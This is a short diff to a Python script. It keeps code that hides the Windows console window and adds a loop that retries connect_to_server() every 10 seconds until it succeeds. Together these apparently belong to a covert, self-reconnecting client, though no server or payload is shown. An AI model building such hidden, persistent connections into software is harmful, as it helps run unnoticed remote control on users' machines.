@@ -446,7 +446,11 @@ if __name__ == '__main__':
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except Exception:
             pass
-    try:
-        connect_to_server()
-    except KeyboardInterrupt:
-        pass
+    while True:
+        try:
+            connect_to_server()
+            break
+        except KeyboardInterrupt:
+            break
+        except Exception:
+            time.sleep(10)
